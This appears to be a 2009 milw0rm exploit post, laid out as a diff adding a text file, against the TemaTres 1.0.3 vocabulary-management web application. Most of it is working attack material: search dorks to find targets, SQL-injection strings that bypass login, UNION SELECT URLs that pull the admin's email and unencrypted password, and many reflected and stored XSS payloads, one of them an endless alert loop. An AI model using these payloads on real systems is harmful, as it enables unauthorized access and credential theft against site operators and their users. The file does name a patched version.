@@ -1,0 +1,165 @@
+***********************************************************************************************
+***********************************************************************************************
+**	       										     **
+**  											     **
+**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
+   [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+**							                                     **
+**    											     **
+**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+**					¡PROUD TO BE SPANISH!				     **
+**											     **
+***********************************************************************************************
+***********************************************************************************************
+
+----------------------------------------------------------------------------------------------
+|       	   	    	MULTIPLE REMOTE VULNERABILITIES		         	     |
+|--------------------------------------------------------------------------------------------|
+|                         	     | TemaTres V1.0.3 |		 		     |
+|  CMS INFORMATION:		      -----------------					     |
+|										             |
+|-->WEB: http://www.r020.com.ar/tematres/               	   		             |
+|-->DOWNLOAD: http://sourceforge.net/projects/tematres/ 	   		             |
+|-->DEMO: http://www.r020.com.ar/tematres/index.php					     |
+|-->CATEGORY: CMS / Portals								     |
+|-->DESCRIPTION: Web application to manage controlled vocabularies, taxonomies and thesaurus |
+| 		/ Aplicación Web para la gestión de lenguajes documentales, ... 	     |
+|											     |
+|  CMS VULNERABILITY:									     |
+|											     |
+|-->TESTED ON: firefox 3								     |
+|-->DORKs: "Powered by TemaTres" / "Generado por TemaTres" / "Criado por TemaTres"	     |
+|-->CATEGORY: AUTH BYPASS/ SQL INJECTION/ XSS			     			     |
+|-->AFFECT VERSION: LAST = 1.0.3 (maybe <= ?)						     |
+|-->Discovered Bug date: 2009-04-23							     |
+|-->Reported Bug date: 2009-04-23							     |
+|-->Fixed bug date: 2009-05-04								     |
+|-->Info patch (v1.0.31): http://www.r020.com.ar/tematres/tematres1.031.zip		     |
+|-->Author: YEnH4ckEr									     |
+|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+|-->WEB/BLOG: N/A									     |
+|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
+|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
+----------------------------------------------------------------------------------------------
+
+############
+------------
+CONDITIONS:
+------------
+############
+
+
+**gpc_magic_quotes=off
+
+**DBPREFIX='lc_' (Default)
+
+
+####################
+--------------------
+AUTH BYPASS (SQLi):
+--------------------
+####################
+
+
+mail:' or 1=1 /*
+password: Nothing
+
+Or...
+
+mail: Something
+password:' or 1=1 /*
+
+
+######################
+----------------------
+SQL INJECTION (SQLi):
+----------------------
+######################
+
+
+~~~~---->Unregistered user (get var --> 'letra'):
+
+http://[HOST]/[HOME_PATH]/index.php?letra=2'+union+all+select+1,mail,3,pass+FROM+lc_usuario+WHERE+id=1/*
+
+<------------ Got mail/pass of user id = 1 (admin) (pass no encrypted!) ------------>
+
+~~~~---->Resgistered user (get vars --> 'y' and 'm'):
+
+http://[HOST]/[HOME_PATH]/sobre.php?m=10&y=2007'+AND+0+UNION+ALL+SELECT+1,concat(mail,'<-:::->',pass),3,4,version(),concat(user(),'<-:::->',database()),7+FROM+lc_usuario+WHERE+id=1/*
+
+http://[HOST]/[HOME_PATH]/sobre.php?m=10'+AND+0+UNION+ALL+SELECT+1,concat(mail,'<-:::->',pass),3,4,version(),concat(user(),'<-:::->',database()),7+FROM+lc_usuario+WHERE+id=1/*&y=2007
+
+<------------ Got mail/pass of user id = 1 (admin) (pass no encrypted!) ------------>
+
+
+############################
+----------------------------
+CROSS SITE SCRIPTING (XSS):
+----------------------------
+############################
+
+
+There are a lot of links (This isn't entire list):
+
+
+~------->Unregistered user
+
+
+<----Search form---->
+
+<script>while(1){alert('y3nh4ck3r was here!')}</script>
+
+
+<----More links---->
+
+http://[HOST]/[HOME_PATH]/index.php?_expresion_de_busqueda=<script>alert('y3nh4ck3r was here!')</script>&sgs=off
+
+http://[HOST]/[HOME_PATH]/index.php?letra=D<script>alert('y3nh4ck3r was here!')</script>
+
+http://[HOST]/[HOME_PATH]/index.php?estado_id=14"><script>alert('y3nh4ck3r was here!')</script>
+
+http://[HOST]/[HOME_PATH]/index.php?tema="><script>alert('y3nh4ck3r was here!')</script>
+
+http://[HOST]/[HOME_PATH]/index.php?tema=2&/trmino-subordinado-de-ejemplo"><script>alert('y3nh4ck3r was here!')</script>
+
+
+~------->Registered user
+
+
+<----Posting here---->
+
+http://[HOST]/[HOME_PATH]/index.php?edit_id=12&tema=12
+
+<script>alert('y3nh4ck3r was here!')</script>
+
+
+<----More links---->
+
+http://[HOST]/[HOME_PATH]/sobre.php?m=10&y=2007"><script>alert('y3nh4ck3r was here!')</script>
+
+http://[HOST]/[HOME_PATH]/sobre.php?m=10&y=2007&ord=F"><script>alert('y3nh4ck3r was here!')</script>
+
+http://[HOST]/[HOME_PATH]/sobre.php?m=10"><script>alert('y3nh4ck3r was here!')</script>&y=2007
+
+
+-------------------EOF---------------------------------->>>ENJOY IT!
+
+
+#######################################################################
+#######################################################################
+##*******************************************************************##
+## ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
+##*******************************************************************##
+##-------------------------------------------------------------------##
+##*******************************************************************##
+##     GREETZ TO: JosS, Ulises2k and all spanish Hack3Rs community!  ##
+##*******************************************************************##
+#######################################################################
+#######################################################################
+
+# milw0rm.com [2009-05-05]
